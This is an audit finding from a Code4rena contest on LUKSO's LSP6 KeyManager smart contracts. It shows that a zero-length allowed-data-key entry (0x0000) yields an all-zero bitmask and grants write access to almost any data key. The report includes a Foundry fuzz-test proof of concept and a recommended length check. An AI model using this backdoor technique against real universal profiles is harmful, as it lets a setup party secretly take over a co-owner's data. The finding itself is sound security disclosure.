## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- downgraded by judge
- high quality report
- primary issue
- satisfactory
- selected for report
- M-07

# [Insufficient Length Check When Verifying Allowed Data Keys](https://github.com/code-423n4/2023-06-lukso-findings/issues/97) 

# Lines of code

https://github.com/code-423n4/2023-06-lukso/blob/9dbc96410b3052fc0fd9d423249d1fa42958cae8/contracts/LSP6KeyManager/LSP6Modules/LSP6SetDataModule.sol#L559; https://github.com/code-423n4/2023-06-lukso/blob/9dbc96410b3052fc0fd9d423249d1fa42958cae8/contracts/LSP6KeyManager/LSP6Modules/LSP6SetDataModule.sol#L679


# Vulnerability details

## Impact
There is an insufficient length check when validating the allowed data keys that can be set by a caller. In particular, if a decoded length in the compact bytes array happens to be 0, the caller will be validated against any data key.

Although a decoded length is not possible when setting allowed data keys via the `LSP6SetDataModule` contract, there is no guarantee that data values before ownership transfer to an LSP6 contract are valid. This allows a scamming opportunity as malicious actors who set-up an ERC725 contract for another can create a backdoor that cannot be easily seen as the allowed data keys will simply have an extra `0x0000`.

When verifying allowed data keys that a caller can set, a length check is done on the first 2 bytes of a compact bytes array to ensure that the length does not exceed a data key's length.

```solidity=559
            if (length > 32)
                revert InvalidEncodedAllowedERC725YDataKeys(
                    allowedERC725YDataKeysCompacted,
                    "couldn't DECODE from storage"
                );
```

This `length` value is used to decide the bit mask when validating data keys.

```solidity=581
            mask =
                bytes32(
                    0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
                ) <<
                (8 * (32 - length));
```

In the case that `length == 0`, then `mask == bytes32(0)`.

Then the validation check for all data keys will pass as the validation will be reduced to whether or not `allowedKey & bytes32(0) == inputDataKey & bytes32(0)`, which is always true.

```solidity=600
                allowedKey := and(memoryAt, mask)
            }

            if (allowedKey == (inputDataKey & mask)) return;
```

This allows the caller to set data values for all data keys except those used for LSP1, LSP6, and LSP17 due to the initial checks in `LSP6SetDataModule._getPermissionRequiredToSetDataKey()`. In particular, they would be able to obstruct data values for the following established keys:
- LSP3 keys detailing information about a universal profile
- LSP5 keys detailing information about received assets
- LSP10 keys detailing information about vault ownership

## Proof of Concept
Suppose userA and userB wish to share a universal profile and decide to use an LSP6 key manager to manage the profile. userA is decided to set-up the contracts. However, userA is malicious and does the following:
- Deploys the universal profile contract with userA as the owner
- Sets up permissions and data keys agreed by userA and userB
  - In particular, assume userA has permission to set data for specific data keys
- Adds `0x0000` at the beginning or end of the allowed data keys of userA
- Deploys the LSP6 key manager
- Transfers ownership of the universal profile to the LSP6 key manager

If userB does not trust userA, they are able to check userA's permissions and allowed data keys, but will find an extra `0x0000` in the allowed data keys, which does not appear malicious. However, this allows userA the ability to change the data value for almost all data keys.

The following fuzz test written in foundry shows that after adding `0x0000` to the allowed data keys of `malicious`, `malicious` is able to set the data value of most data keys.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-std/Test.sol";
import "../src/UniversalProfile.sol";
import "../src/LSP9Vault/LSP9Vault.sol";
import "../src/LSP1UniversalReceiver/LSP1UniversalReceiverDelegateUP/LSP1UniversalReceiverDelegateUP.sol";
import "../src/LSP6KeyManager/LSP6KeyManager.sol";
import "../src/LSP14Ownable2Step/ILSP14Ownable2Step.sol";
import "../submodules/ERC725/implementations/contracts/interfaces/IERC725Y.sol";

import {BytesLib} from "solidity-bytes-utils/contracts/BytesLib.sol";
import {LSP2Utils} from "../src/LSP2ERC725YJSONSchema/LSP2Utils.sol";

import "../src/LSP1UniversalReceiver/LSP1Constants.sol";
import "../src/LSP6KeyManager/LSP6Constants.sol";
import "../src/LSP17ContractExtension/LSP17Constants.sol";

contract LSP6Test is Test {
    using BytesLib for bytes;

    UniversalProfile profile;
    LSP9Vault vault;
    LSP1UniversalReceiverDelegateUP LSP1Delegate;
    LSP6KeyManager keyManager;


    function setUp() public {
        profile = new UniversalProfile(address(this));
        keyManager = new LSP6KeyManager(address(profile));
        LSP1Delegate = new LSP1UniversalReceiverDelegateUP();
        profile.setData(_LSP1_UNIVERSAL_RECEIVER_DELEGATE_KEY, bytes.concat(bytes20(address(LSP1Delegate))));
    }

    function testLSP6BypassAllowedDataKeys(bytes32 dataKey, bytes32 _dataValue) public {
        // dataKey cannot be LSP1, LSP6, or LSP17 data key
        vm.assume(bytes16(dataKey) != _LSP6KEY_ADDRESSPERMISSIONS_ARRAY_PREFIX);
        vm.assume(bytes6(dataKey) != _LSP6KEY_ADDRESSPERMISSIONS_PREFIX);
        vm.assume(bytes12(dataKey) != _LSP1_UNIVERSAL_RECEIVER_DELEGATE_PREFIX);
        vm.assume(bytes12(dataKey) != _LSP17_EXTENSION_PREFIX);

        // Give owner ability to transfer ownership
        bytes32 ownerDataKey = LSP2Utils.generateMappingWithGroupingKey(
            _LSP6KEY_ADDRESSPERMISSIONS_PERMISSIONS_PREFIX,
            bytes20(address(this))
        );
        profile.setData(ownerDataKey, bytes.concat(_PERMISSION_CHANGEOWNER));

        // Set permissions and allowed data keys for malicious address
        address malicious = vm.addr(1234);

        bytes32 permissionsDataKey = LSP2Utils.generateMappingWithGroupingKey(
            _LSP6KEY_ADDRESSPERMISSIONS_PERMISSIONS_PREFIX,
            bytes20(malicious)
        );
        bytes32 allowedDataKeysDataKey = LSP2Utils.generateMappingWithGroupingKey(
            _LSP6KEY_ADDRESSPERMISSIONS_AllowedERC725YDataKeys_PREFIX,
            bytes20(malicious)
        );

        profile.setData(permissionsDataKey, bytes.concat(_PERMISSION_SETDATA | _PERMISSION_CHANGEOWNER));
        profile.setData(allowedDataKeysDataKey, bytes.concat(bytes2(0)));

        // Transfer ownership to LSP6KeyManager
        profile.transferOwnership(address(keyManager));
        bytes memory payload = abi.encodeWithSelector(
            ILSP14Ownable2Step.acceptOwnership.selector, 
            ""
        );
        keyManager.execute(payload);
        assert(profile.owner() == address(keyManager));

        // Verify malicious can set data for most data keys
        bytes memory arg = abi.encode(dataKey, bytes.concat(_dataValue));
        bytes memory data = abi.encodeWithSelector(
            IERC725Y.setData.selector, 
            arg
        );
        keyManager.lsp20VerifyCall(malicious, 0, data);
    }
}
```


## Tools Used
Manual

## Recommended Mitigation Steps
It is recommended to add a check requiring that `length > 0`.


## Assessed type

Other